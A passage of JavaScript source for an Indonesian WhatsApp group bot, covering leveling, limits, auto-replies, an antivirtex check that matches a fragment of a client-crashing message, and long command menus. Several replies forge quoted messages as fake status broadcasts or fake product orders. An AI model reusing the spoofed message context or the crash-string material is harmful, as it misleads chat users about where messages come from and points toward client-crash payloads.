                                        const requiredXp = 5000 * (Math.pow(2, currentLevel) - 1)
                                        const getLevel = getLevelingLevel(sender)
                                        addLevelingXp(sender, amountXp)
                                        if (requiredXp <= getLevelingXp(sender)) {
                                        addLevelingLevel(sender, 1)
                                        await reply(`*「 LEVEL UP 」*\n  ╔════════════════════\n  ╠═➥ *Name*: ${sender}\n  ╠═➥ *XP*: ${getLevelingXp(sender)}\n  ╠═➥ *Level*: ${getLevel} -> ${getLevelingLevel(sender)}\n  ╚════════════════════\n\nCongrats!! 🥳🎉`)
                                }
                        } catch (err) {
                                console.error(err)
                        }
                }
                //function check limit
                const checkLimit = (sender) => {
                        let found = false
                        for (let lmt of _limit) {
                                if (lmt.id === sender) {
                                        limitCounts = limitawal - lmt.limit
                                        if (limitCounts <= 0) return zaki.sendMessage(from,`Limit request anda sudah habis\n\n_Note : Limit akan direset setiap jam 21:00!_`, text,{ quoted: mek})
                                        zaki.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                                        found = true
                                }
                        }
                        if (found === false) {
                                let obj = { id: sender, limit: 1 }
                                _limit.push(obj)
                                fs.writeFileSync('./database/json/limit.json', JSON.stringify(_limit))
                                zaki.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                        }
                }

                //funtion limited
                const isLimit = (sender) =>{
                        let position = false
                        for (let i of _limit) {
                                if (i.id === sender) {
                                        let limits = i.limit
                                        if (limits >= limitawal ) {
                                                position = true
                                                zaki.sendMessage(from, ind.limitend(pushname), text, {quoted: mek})
                                                return true
                                        } else {
                                                _limit
                                                position = true
                                                return false
                                        }
                                }
                        }
                        if (position === false) {
                                const obj = { id: sender, limit: 1 }
                                _limit.push(obj)
                                fs.writeFileSync('./database/json/limit.json',JSON.stringify(_limit))
                                return false
                        }
                }
                for (let x of mentionUser) {

                if (afk.hasOwnProperty(x.split('@')[0])) {

                    ini_txt = "\`\`\`Orangnya lagi Afk kak!\`\`\`\n"
                    if (afk[x.split('@')[0]] !="") {
                        ini_txt += "\`\`\`Alasan:\`\`\` " + afk[x.split('@')[0]]
                    }
                    zaki.sendMessage(from, ini_txt, text, { thumbnail: zakinew, sendEphemeral: true, quoted: mek})
                }
            }
            if (afk.hasOwnProperty(sender.split('@')[0])) {
                reply(`\`\`\`${pushname} telah kembali dari Afk!\`\`\``)
                delete afk[sender.split('@')[0]]
                fs.writeFileSync("./database/json/afk.json", JSON.stringify(afk))
            }

                if (isGroup) {
                        try {
                                const getmemex = groupMembers.length
                                if (getmemex <= memberlimit) {
					reply(`Maaf member group belum memenuhi syarat. minimal member group adalah ${memberlimit}`)
                                        setTimeout( () => {
                                                zaki.groupLeave(from)
					}, 5000)
					setTimeout( () => {
						zaki.updatePresence(from, Presence.composing)
						reply("2detik")
					}, 3000)
					setTimeout( () => {
						zaki.updatePresence(from, Presence.composing)
						reply("3detik")
					}, 2000)
					setTimeout( () => {
						zaki.updatePresence(from, Presence.composing)
						reply("4detik")
					}, 1000)
					setTimeout( () => {
						zaki.updatePresence(from, Presence.composing)
						reply("5detik")
					}, 0)
                                }
                        } catch {
                                console.error(err)
                        }
                }

                //function bamekce
                if (isRegister && isGroup ) {
                        const checkATM = checkATMuser(sender)
                        try {
                                if (checkATM === undefined) addATM(sender)
                                const uangsaku = Math.floor(Math.random() * 10) + 90
                                addKoinUser(sender, uangsaku)
                        } catch (err) {
                                console.error(err)
                        }
                }
/*************ANTI LINK************/
                if (messagesC.includes("://chat.whatsapp.com/")){
		        if (!isGroup) return
		        if (!isAntiLink) return
		        if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
		        zaki.updatePresence(from, Presence.composing)
		        if (messagesC.includes("#izinadmin")) return reply("#izinadmin diterima")
		        var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		        reply(`Link Group Terdeteksi maaf ${sender.split("@")[0]} anda akan di kick dari group 5detik lagi`)
		        setTimeout( () => {
			        zaki.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		        }, 5000)
		        setTimeout( () => {
			        zaki.updatePresence(from, Presence.composing)
			        reply("1detik")
		        }, 4000)
		        setTimeout( () => {
			        zaki.updatePresence(from, Presence.composing)
		                reply("2detik")
		        }, 3000)
		        setTimeout( () => {
			        zaki.updatePresence(from, Presence.composing)
			        reply("3detik")
		        }, 2000)
		        setTimeout( () => {
			        zaki.updatePresence(from, Presence.composing)
			        reply("4detik")
		        }, 1000)
		        setTimeout( () => {
			        zaki.updatePresence(from, Presence.composing)
			        reply("5detik")
		        }, 0)
	        }
/************FUNTION BADWORD*************/
 	   	if (isGroup && isBadWord) {
                        if (bad.includes(messagesC)) {
                                if (!isGroupAdmins) {
                                        return reply("JANGAN TOXIC KAK😠")
                                        .then(() => zaki.groupRemove(from, sender))
                                        .then(() => {
                                                zaki.sendMessage(from, `*「 ANTI BADWORD 」*\nKamu dikick karena berkata kasar!`, text ,{quoted: mek})
                                        }).catch(() => zaki.sendMessage(from, `Untung cya bukan admin, kalo admin udah cya kick!`, text , {quoted : mek}))
                                } else {
                                        return reply( "Tolong Jaga Ucapan Min 😇")
                                }
                        }
                }

	/****** FUNCTION ANTIVIRTEX ***********/

	if (messagesC.includes('ดุท้่เึางืผิดุท้่เึางื')){

		if (!isGroup) return
		        if (!isAntivirtex) return
		        if (isGroupAdmins) return reply('karena kamu adalah admin group, bot tidak akan kick kamu')
		zaki.updatePresence(from, Presence.composing)
		var kicc = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`Virtex Terdeteksi maaf ${sender.split("@")[0]} anda akan di kick dari group 10detik lagi`)
		setTimeout( () => {
			zaki.groupRemove(from, [kicc]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 10000)
		setTimeout( () => {
			zaki.updatePresence(from, Presence.composing)
			reply("1detik")
		}, 9000)
		setTimeout( () => {
			zaki.updatePresence(from, Presence.composing)
			reply("2detik")
		}, 8000)
		setTimeout( () => {
			zaki.updatePresence(from, Presence.composing)
reply("3detik")
		}, 7000)
		setTimeout( () => {
			zaki.updatePresence(from, Presence.composing)
reply("4detik")
		}, 6000)
		setTimeout( () => {
			zaki.updatePresence(from, Presence.composing)
reply("5detik")
		}, 5000)
		setTimeout( () => {
			zaki.updatePresence(from, Presence.composing)
reply("6detik")
		}, 4000)
		setTimeout( () => {
			zaki.updatePresence(from, Presence.composing)
reply("7detik")
		}, 3000)
		setTimeout( () => {
			zaki.updatePresence(from, Presence.composing)
reply("8detik")
		}, 2000)
		setTimeout( () => {
			zaki.updatePresence(from, Presence.composing)
reply("9detik")
		}, 1000)
		setTimeout( () => {
			zaki.updatePresence(from, Presence.composing)
reply("10detik")
		}, 0)
	}
/**************COLORS*****************/
			colors = ['red','white','black','blue','yellow','green']
			const isMedia = (type === 'imageMessage' || type === 'videoMessage')
			const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
      const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
			const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
			const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
			if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mZAKI EXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
			if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mZAKI RECV\x1b[1;37m]', time, color('Message'), 'from', color(pushname), 'args :', color(args.length))
			if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mZAKI EXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
			if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mZAKI RECV\x1b[1;37m]', time, color('Message'), 'from', color(pushname), 'in', color(groupName), 'args :', color(args.length)) 

        // TicTacToe

        if (isTicTacToe(from, tictactoe) && !isMuted) {
            tictac(chats, prefix, tictactoe, from, sender, reply, mentions, addBalance, balance)
        }
/*************Auto respon************/
   if(budy.match('@6283873394995')){
result = fs.readFileSync(`./temp/sticker/owner.webp`)
  zaki.sendMessage(from, result, sticker, {
quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { mimetype: "image/jpeg", "caption": ` *STOP TAG OWNER GUA* `, "jpegThumbnail": fs.readFileSync('./temp/image/tahta.jpeg') } } } } )
}
if(budy.match('@6283899090373')){
result = fs.readFileSync(`./temp/sticker/aplo.webp`)

  zaki.sendMessage(from, result, sticker, {
quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { mimetype: "image/jpeg", "caption": ` *NGAPAIN TAG GUA* `, "jpegThumbnail": fs.readFileSync('./temp/image/tahta.jpeg') } } } } )
}
 	
 	 if (budy.match('hlx')){ buffer = await fs.readFileSync('./temp/audio/wibu.mp3')               
 	 zaki.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: mek, ptt: true })
 	 }
 	 if (budy.match('Assalamualaikum')){ buffer = await fs.readFileSync('./temp/audio/wal.mp3')               
 	 zaki.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: mek, ptt: true })
   }
   if (budy.match('bernyanyi')){ buffer = await fs.readFileSync('./temp/audio/bernyanyi.mp3')               

 	 zaki.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: mek, ptt: true })

   }
   if(budy.match('Hlx')){
result = fs.readFileSync(`./temp/sticker/ap.webp`)
  zaki.sendMessage(from, result, sticker, {
quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { mimetype: "image/jpeg", "caption": ` *Ada Yang Memanggil aku?*  `, "jpegThumbnail": fs.readFileSync('./temp/image/tahta.jpeg') } } } } )
}
/***********IKLAN BOT**************/

			switch(command) {
			  
			  case 'jadibot':
    jadibot(reply,zaki,from)
    break
    case 'stopjadibot':
    stopjadibot(reply)
    break
    case 'listbot':
    let tekss = '「 *LIST JADIBOT* 」\n'
    for(let i of listjadibot) {
    tekss += `*Nomor* : ${i.jid.split('@')[0]}
*Nama* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`
    }
    reply(text)
    break
    
			    
			                  case 'allmenu':

                                        if (!isRegister) return reply(mess.only.daftarB)
                                        
                      uptime = process.uptime()
                      
                      const getruntime = kyun(uptime)
                     const reqXp  = 5000 * (Math.pow(2, getLevelingLevel(sender)) - 1)
			                const uangku = checkATMuser(sender)
                     const hour_now = moment().format('HH:mm')
                    
                     
                     let batanu = global.batrei[global.batrei.length - 1]
                     
                     await zaki.sendMessage(from, help(pushname, prefix, botName, ownerName, uangku, reqXp, _registered, role, time, date, totalchat, getruntime, device_manufacturer, device_model, mcc, mnc, os_version, wa_version, premium, prema, Eventon, Leveling, Welkom, AntiLink, BadWord, Antivirtex, batanu), text,{quoted:{ key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { mimetype: "image/jpeg", "caption": `Hai ${pushname}*
Nama : _*BOTHLX*_
Rate : ★★★★✩`, "jpegThumbnail": fs.readFileSync('./temp/image/tahta.jpeg') } } } } )

break                                                  
case 'help':
case 'menu':
  if (!isRegister) return reply(mess.only.daftarB)
                                        

                      uptime = process.uptime()
                      
                      const aktifruntime = kyun(uptime)
                    
                     uptime = process.uptime()
                     
                     const reqXpp  = 5000 * (Math.pow(2, getLevelingLevel(sender)) - 1)
			                const uangkuu = checkATMuser(sender)
                     
                     let batanuuy = global.batrei[global.batrei.length - 1]
                     
                     dmenu = fs.readFileSync(`./temp/image/profile.jpeg`)
                     

 menunya =`╭───❲ INFO ABOUT ❳──────
│❏ *Group Bot 1* : https://chat.whatsapp.com/JNxkmhX2nzvAUx50IbBs1j
│❏ *Group Bot 2* : https://chat.whatsapp.com/Faz1qmFp1i8LjnTxjeDPnL
│❏ *IG* : https://Instagram.com/ahmadzaki_yo
│❏ *GITHUB* : https://github.com/Ahmadzakix
│❏ *REST API* : https://zaki-api.herokuapp.com
╰────────────────────

╭───❲ INFO USER BOT ❳────
│❏Name : \`\`\`${pushname}\`\`\`
│❏Role : \`\`\`${role}\`\`\`
│❏Status : \`\`\`${prema}\`\`\`
│❏Uang : \`\`\`${uangkuu}\`\`\`
│❏Xp : \`\`\`${reqXpp}\`\`\`
│❏Time : \`\`\`${time}\`\`\`
│❏Calendar: \`\`\`${date}\`\`\`
╰────────────────────

╭──────❲ INFO BOT ❳─────
│❏Nama : \`\`\`${botName}\`\`\`
│❏Total User : \`\`\`${_registered.length}\`\`\`
│❏User Premium : \`\`\`${premium.length}\`\`\`
│❏Total Chat : \`\`\`${totalchat.length}\`\`\`
│❏Browser : Chrome\`\`\`
│❏WAConnection : Baileys\`\`\`
│❏Bot Version : 0.0.8\`\`\`
│❏Prefix : 「MULTI PREFIX」\`\`\`
│❏Aktif : \`\`\`${aktifruntime}\`\`\`
╰────────────────────

╭────❲ GROUP INFO ❳─────
│❏ Event : \`\`\`${Eventon}\`\`\`
│❏ Leveling : \`\`\`${Leveling}\`\`\`
│❏ Welcome : \`\`\`${Welkom}\`\`\`
│❏ AntiLink : \`\`\`${AntiLink}\`\`\`
│❏ Antivirtex: \`\`\`${Antivirtex}\`\`\`
│❏ AntiBadWord : \`\`\`${BadWord}\`\`\`
╰────────────────────

╭────❲ DEVICE BOT ❳─────
│❏ Battery : \`\`\`${batanuuy}\`\`\`
│❏ Device : \`\`\`${device_manufacturer}\`\`\`
│❏ Versi Whatsapp: \`\`\`${wa_version}\`\`\`
│❏ Versi OS : \`\`\`${os_version}\`\`\`
│❏ Versi Device : \`\`\`${device_model}\`\`\`
│❏ RAM :  \`\`\`${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB /  \`\`\`${Math.round(require('os').totalmem / 1024 / 1024)}MB\`\`\`
│❏ MCC : \`\`\`${mcc}\`\`\`
│❏ MNC : \`\`\`${mnc}\`\`\`
╰────────────────────

\`\`\`╭────❲ MENU BOT ❳─────
\`\`\`│❏  ${prefix}allmenu\`\`\`
\`\`\`│❏  ${prefix}makermenu\`\`\`
\`\`\`│❏  ${prefix}groupmenu\`\`\`
\`\`\`│❏  ${prefix}downloadmenu\`\`\`
\`\`\`│❏  ${prefix}searchmenu\`\`\`
\`\`\`│❏  ${prefix}educationmenu\`\`\`
\`\`\`│❏  ${prefix}randommenu\`\`\`
\`\`\`│❏  ${prefix}filmmenu\`\`\`
\`\`\`│❏  ${prefix}mememenu\`\`\`
\`\`\`│❏  ${prefix}musicmenu\`\`\`
\`\`\`│❏  ${prefix}othermenu\`\`\`
\`\`\`│❏  ${prefix}soundmenu\`\`\`
\`\`\`│❏  ${prefix}islammenu\`\`\`
\`\`\`│❏  ${prefix}wibumenu\`\`\`
\`\`\`│❏  ${prefix}stalkmenu\`\`\`
\`\`\`│❏  ${prefix}18+menu\`\`\`
\`\`\`│❏  ${prefix}primbonmenu\`\`\`
\`\`\`│❏  ${prefix}xpmenu\`\`\`
\`\`\`│❏  ${prefix}limitmenu\`\`\`
\`\`\`│❏  ${prefix}funmenu\`\`\`
\`\`\`│❏  ${prefix}storagemenu\`\`\`
\`\`\`│❏  ${prefix}ongoingmenu\`\`\`
\`\`\`└❏ ${prefix}ownermenu\`\`\`
\`\`\`❏───「 ${botName} 」───❏\`\`\``
zaki.sendMessage(from, dmenu, image, { mimetype: Mimetype.image, quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) },message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./temp/image/HLXB.jpeg`)},"title": dfg,"description": dfg,"currencyCode": "IDR","priceAmount1000": "9999","retailerId": dfg,"productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}, thumbnail: zakinew, caption: menunya})
break                                                  

//MAKERMENU
				case 'makermenu':
					if (!isRegister) return reply(mess.only.daftarB)
					const maker = `╭─────────────────────
│    「 MAKER MENU 」
│─────────────────────
│❏ \`\`\`${prefix}sticker\`\`\`
│❏ \`\`\`${prefix}stickergif\`\`\`
│❏ \`\`\`${prefix}ttp\`\`\`
│❏ \`\`\`${prefix}triggred\`\`\`
│❏ \`\`\`${prefix}deletepc\`\`\`
│❏ \`\`\`${prefix}komunis\`\`\`
│❏ \`\`\`${prefix}ktpmaker\`\`\`
│❏ \`\`\`${prefix}wasted\`\`\`
│❏ \`\`\`${prefix}wanted\`\`\`
│❏ \`\`\`${prefix}gtav\`\`\`
│❏ \`\`\`${prefix}tomp4\`\`\`
│❏ \`\`\`${prefix}attp [ text ]\`\`\`
│❏ \`\`\`${prefix}nulis1\`\`\`
│❏ \`\`\`${prefix}nulis2\`\`\`
│❏ \`\`\`${prefix}nulis3\`\`\`
│❏ \`\`\`${prefix}nulis4\`\`\`
│❏ \`\`\`${prefix}nulis5\`\`\`
│❏ \`\`\`${prefix}nulis6\`\`\`
│❏ \`\`\`${prefix}video1\`\`\`
│❏ \`\`\`${prefix}video2\`\`\`
│❏ \`\`\`${prefix}video3\`\`\`
│❏ \`\`\`${prefix}video4\`\`\`
│❏ \`\`\`${prefix}video5\`\`\`
│❏ \`\`\`${prefix}video6\`\`\`
│❏ \`\`\`${prefix}phlogo [ text ]\`\`\`
│❏ \`\`\`${prefix}bplogo [ text ]\`\`\`
│❏ \`\`\`${prefix}tahta [ text ]\`\`\`
│❏ \`\`\`${prefix}neon2\`\`\`
│❏ \`\`\`${prefix}wall\`\`\`
│❏ \`\`\`${prefix}wolf\`\`\`
│❏ \`\`\`${prefix}tfire\`\`\`
│❏ \`\`\`${prefix}ytgold\`\`\`
│❏ \`\`\`${prefix}ytsilver\`\`\`
│❏ \`\`\`${prefix}t3d\`\`\`
│❏ \`\`\`${prefix}logoa\`\`\`
│❏ \`\`\`${prefix}marvel\`\`\`
│❏ \`\`\`${prefix}leavest\`\`\`
│❏ \`\`\`${prefix}phcoment\`\`\`
│❏ \`\`\`${prefix}neon1\`\`\`
│❏ \`\`\`${prefix}text3d\`\`\`
│❏ \`\`\`${prefix}galaxy\`\`\`
│❏ \`\`\`${prefix}gaming\`\`\`
│❏ \`\`\`${prefix}colors\`\`\`
│❏ \`\`\`${prefix}kling\`\`\`
│❏ \`\`\`${prefix}8bit\`\`\`
│❏ \`\`\`${prefix}burn\`\`\`
│❏ \`\`\`${prefix}fire\`\`\`
│❏ \`\`\`${prefix}googlequery\`\`\`
│❏ \`\`\`${prefix}battle\`\`\`
│❏ \`\`\`${prefix}block\`\`\`
│❏ \`\`\`${prefix}candy\`\`\`
│❏ \`\`\`${prefix}potter\`\`\`
│❏ \`\`\`${prefix}silk\`\`\`
│❏ \`\`\`${prefix}water\`\`\`
│❏ \`\`\`${prefix}pubg\`\`\`
│❏ \`\`\`${prefix}neon\`\`\`
│❏ \`\`\`${prefix}coffe1\`\`\`
│❏ \`\`\`${prefix}coffe\`\`\`
│❏ \`\`\`${prefix}tiktok\`\`\`
│❏ \`\`\`${prefix}shadow\`\`\`
│❏ \`\`\`${prefix}romance\`\`\`
│❏ \`\`\`${prefix}glass\`\`\`
│❏ \`\`\`${prefix}naruto\`\`\`
│❏ \`\`\`${prefix}mug1\`\`\`
│❏ \`\`\`${prefix}love\`\`\`
│❏ \`\`\`${prefix}mug\`\`\`
│❏ \`\`\`${prefix}neon1\`\`\`
│❏ \`\`\`${prefix}smoke\`\`\`
│❏ \`\`\`${prefix}rainbow\`\`\`
│❏ \`\`\`${prefix}shadow2\`\`\`
│❏ \`\`\`${prefix}cup\`\`\`
│❏ \`\`\`${prefix}cup2\`\`\`
│❏ \`\`\`${prefix}romance2\`\`\`
│❏ \`\`\`${prefix}smoke\`\`\`
│❏ \`\`\`${prefix}burnpaper\`\`\`
│❏ \`\`\`${prefix}lovemessage\`\`\`
│❏ \`\`\`${prefix}undergrass\`\`\`
│❏ \`\`\`${prefix}love\`\`\`
│❏ \`\`\`${prefix}coffe\`\`\`
│❏ \`\`\`${prefix}woodheart\`\`\`
│❏ \`\`\`${prefix}flowerheart\`\`\`
│❏ \`\`\`${prefix}woodenboard\`\`\`
│❏ \`\`\`${prefix}summer3d\`\`\`
│❏ \`\`\`${prefix}wolfmetal\`\`\`
│❏ \`\`\`${prefix}nature3d\`\`\`
│❏ \`\`\`${prefix}underwater\`\`\`
│❏ \`\`\`${prefix}golderrose\`\`\`
│❏ \`\`\`${prefix}summernature\`\`\`
│❏ \`\`\`${prefix}letterleaves\`\`\`
│❏ \`\`\`${prefix}glowingneon\`\`\`
│❏ \`\`\`${prefix}falleaves\`\`\`
│❏ \`\`\`${prefix}flamming\`\`\`
│❏ \`\`\`${prefix}potter\`\`\`
│❏ \`\`\`${prefix}carvedwood\`\`\`
│❏ \`\`\`${prefix}wetglass\`\`\`
│❏ \`\`\`${prefix}multicolor3d\`\`\`
│❏ \`\`\`${prefix}watercolor\`\`\`
│❏ \`\`\`${prefix}luxurygold\`\`\`
│❏ \`\`\`${prefix}galaxywallpaper\`\`\`
│❏ \`\`\`${prefix}lighttext\`\`\`
│❏ \`\`\`${prefix}beautifulflower\`\`\`
│❏ \`\`\`${prefix}puppycute\`\`\`
│❏ \`\`\`${prefix}royaltext\`\`\`
│❏ \`\`\`${prefix}heartshaped\`\`\`
│❏ \`\`\`${prefix}birthdaycake\`\`\`
│❏ \`\`\`${prefix}galaxystyle\`\`\`
│❏ \`\`\`${prefix}hologram3d\`\`\`
│❏ \`\`\`${prefix}greenneon\`\`\`
│❏ \`\`\`${prefix}glossychrome\`\`\`
│❏ \`\`\`${prefix}greenbush\`\`\`
│❏ \`\`\`${prefix}metallogo\`\`\`
│❏ \`\`\`${prefix}noeltext\`\`\`
│❏ \`\`\`${prefix}glittergold\`\`\`
│❏ \`\`\`${prefix}textcake\`\`\`
│❏ \`\`\`${prefix}starsnight\`\`\`
│❏ \`\`\`${prefix}wooden3d\`\`\`
│❏ \`\`\`${prefix}textbyname\`\`\`
│❏ \`\`\`${prefix}writegalacy\`\`\`
│❏ \`\`\`${prefix}galaxybat\`\`\`
│❏ \`\`\`${prefix}snow3d\`\`\`
│❏ \`\`\`${prefix}birthdayday\`\`\`
│❏ \`\`\`${prefix}gplybutton\`\`\`
│❏ \`\`\`${prefix}splybutton\`\`\`
│❏ \`\`\`${prefix}epep\`\`\`
│❏ \`\`\`${prefix}galaxtext\`\`\`
│❏ \`\`\`${prefix}thunder\`\`\`
│❏ \`\`\`${prefix}imgmaker\`\`\`
│❏ \`\`\`${prefix}calendermaker\`\`\`
│❏ \`\`\`${prefix}pantaimalam\`\`\`
│❏ \`\`\`${prefix}costumwp\`\`\`
│❏ \`\`\`${prefix}facebookpage\`\`\`
│❏ \`\`\`${prefix}gtav\`\`\`
│❏ \`\`\`${prefix}wanted\`\`\`
│❏ \`\`\`${prefix}bplogo\`\`\`
│❏ \`\`\`${prefix}pencil\`\`\`
│❏ \`\`\`${prefix}crossgun\`\`\`
│❏ \`\`\`${prefix}bakar\`\`\`
│❏ \`\`\`${prefix}blackpink\`\`\`
│❏ \`\`\`${prefix}neon\`\`\`
│❏ \`\`\`${prefix}greenneon\`\`\`
│❏ \`\`\`${prefix}advanceglow\`\`\`
│❏ \`\`\`${prefix}futureneon\`\`\`
│❏ \`\`\`${prefix}sandwriting\`\`\`
│❏ \`\`\`${prefix}sandsummer\`\`\`
│❏ \`\`\`${prefix}sandengraved\`\`\`
│❏ \`\`\`${prefix}metaldark\`\`\`
│❏ \`\`\`${prefix}neonlight\`\`\`
│❏ \`\`\`${prefix}holographic\`\`\`
│❏ \`\`\`${prefix}text1917\`\`\`
│❏ \`\`\`${prefix}minion\`\`\`
│❏ \`\`\`${prefix}deluxesilver\`\`\`
│❏ \`\`\`${prefix}newyearcard\`\`\`
│❏ \`\`\`${prefix}bloodfrosted\`\`\`
│❏ \`\`\`${prefix}halloween\`\`\`
│❏ \`\`\`${prefix}jokerlogo\`\`\`
│❏ \`\`\`${prefix}fireworksparkle\`\`\`
│❏ \`\`\`${prefix}natureleaves\`\`\`
│❏ \`\`\`${prefix}bokeh\`\`\`
│❏ \`\`\`${prefix}toxic\`\`\`
│❏ \`\`\`${prefix}strawberry\`\`\`
│❏ \`\`\`${prefix}box3d\`\`\`
│❏ \`\`\`${prefix}roadwarning\`\`\`
│❏ \`\`\`${prefix}breakwall\`\`\`
│❏ \`\`\`${prefix}icecold\`\`\`
│❏ \`\`\`${prefix}luxury\`\`\`
│❏ \`\`\`${prefix}cloud\`\`\`
│❏ \`\`\`${prefix}summersand\`\`\`
│❏ \`\`\`${prefix}horrorblood\`\`\`
│❏ \`\`\`${prefix}thunder2\`\`\`
│❏ \`\`\`${prefix}marvel\`\`\`
│❏ \`\`\`${prefix}kannagen\`\`\`
╰────────────────────`
					zaki.sendMessage(from, maker, text, { thumbnail: zakinew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./temp/image/HLXB.jpeg'), surface: 200, message: '𝙷𝙻𝚇 𝙱𝙾𝚃', orderTitle: '𝙷𝙻𝚇 𝙱𝙾𝚃', sellerJid: '0@s.whatsapp.net'}}}})
					break                                                  

//SEARCH MENU
	case 'searchmenu':
					if (!isRegister) return reply(mess.only.daftarB)

					const search = `╭─────────────────────
│   「 SEARCH MENU 」
│─────────────────────
│❏ \`\`\`${prefix}wait [ Tagimage ]\`\`\`
│❏ \`\`\`${prefix}ytsearch [ query ]\`\`\`
│❏ \`\`\`${prefix}spotifysearch\`\`\`
│❏ \`\`\`${prefix}wiki [ query ]\`\`\`
│❏ \`\`\`${prefix}playstore [ query ]\`\`\`
│❏ \`\`\`${prefix}playvideo\`\`\`
│❏ \`\`\`${prefix}google\`\`\`
│❏ \`\`\`${prefix}happymod\`\`\`
│❏ \`\`\`${prefix}mooddroid\`\`\`
╰────────────────────`
					zaki.sendMessage(from, search, text, { thumbnail: zakinew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./temp/image/HLXB.jpeg'), surface: 200, message: '𝙷𝙻𝚇 𝙱𝙾𝚃', orderTitle: '𝙷𝙻𝚇 𝙱𝙾𝚃', sellerJid: '0@s.whatsapp.net'}}}})
					break                                                  

//educationmenu
	case 'educationmenu':

					if (!isRegister) return reply(mess.only.daftarB)

					const education = `╭─────────────────────
│  「 EDUCATION MENU 」
│─────────────────────
│❏ \`\`\`${prefix}wiki [ query ]\`\`\`
│❏ \`\`\`${prefix}wikien [ query ]\`\`\`
│❏ \`\`\`${prefix}translate\`\`\`
│❏ \`\`\`${prefix}nulis [ text ]\`\`\`
│❏ \`\`\`${prefix}quotes\`\`\`
│❏ \`\`\`${prefix}quotesanime\`\`\`
│❏ \`\`\`${prefix}quotesdilan\`\`\`
│❏ \`\`\`${prefix}cerpen\`\`\`
│❏ \`\`\`${prefix}ceritahoror\`\`\`
╰────────────────────`
					zaki.sendMessage(from, education, text, { thumbnail: zakinew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./temp/image/HLXB.jpeg'), surface: 200, message: '𝙷𝙻𝚇 𝙱𝙾𝚃', orderTitle: '𝙷𝙻𝚇 𝙱𝙾𝚃', sellerJid: '0@s.whatsapp.net'}}}})
					break                                                  

//downloadmenu
	case 'downloadmenu':

					if (!isRegister) return reply(mess.only.daftarB)

					const download = `╭─────────────────────
│  「 DOWNLOAD MENU 」
│─────────────────────
│❏ \`\`\`${prefix}ytmp3 [ link ]\`\`\`
│❏ \`\`\`${prefix}ytmp4 [ link ]\`\`\`
│❏ \`\`\`${prefix}spotify [ link ]\`\`\`
│❏ \`\`\`${prefix}pinterest [ query ]\`\`\`
│❏ \`\`\`${prefix}igvideo [ link ]\`\`\`
│❏ \`\`\`${prefix}igfoto [ link ]\`\`\`
│❏ \`\`\`${prefix}tiktoknowm [link]\`\`\`
│❏ \`\`\`${prefix}drivevid [link]\`\`\`
│❏ \`\`\`${prefix}img2url\`\`\`
│❏ \`\`\`${prefix}google\`\`\`
│❏ \`\`\`${prefix}googleimage\`\`\`
│❏ \`\`\`${prefix}ytsearch\`\`\`
│❏ \`\`\`${prefix}play\`\`\`
│❏ \`\`\`${prefix}playvideo\`\`\`
│❏ \`\`\`${prefix}tiktokstalk\`\`\`
│❏ \`\`\`${prefix}tiktok\`\`\`
│❏ \`\`\`${prefix}tiktokdl\`\`\`
│❏ \`\`\`${prefix}tiktokaudio\`\`\`
│❏ \`\`\`${prefix}fbdl\`\`\`
│❏ \`\`\`${prefix}igvid\`\`\`
│❏ \`\`\`${prefix}igdl\`\`\`
│❏ \`\`\`${prefix}igtv\`\`\`
│❏ \`\`\`${prefix}joox [query]\`\`\`
╰────────────────────`
